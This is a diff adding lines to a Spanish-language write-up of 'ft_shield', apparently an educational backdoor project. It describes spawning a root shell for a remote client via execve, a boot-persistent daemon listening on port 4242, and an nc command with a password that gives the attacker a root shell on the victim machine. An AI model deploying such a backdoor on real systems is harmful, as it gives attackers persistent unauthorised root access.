@@ -63,3 +63,18 @@ Una vez establecidos de forma estable en el fondo del sistema operativo, activam
 12. 
 **Invocación de la Shell de Root:** Finalmente, ejecutamos un `execve("/bin/sh", NULL, NULL)`. Al haber redirigido los descriptores en el paso anterior, el cliente remoto que está escuchando al otro lado de la red recibirá los datos del sistema y obtendrá una terminal interactiva con plenos derechos de `root`.
 
+
+
+```bash
+Atacante ejecuta ft_shield → máquina infectada
+                              → daemon arranca en cada boot
+                              → atacante se conecta por red al puerto 4242
+                              → introduce password
+                              → tiene shell root
+```
+```bash
+nc ip_victima 4242
+Keycode: mipassword
+$> shell
+# ahora tenemos una shell root en la máquina víctima
+```
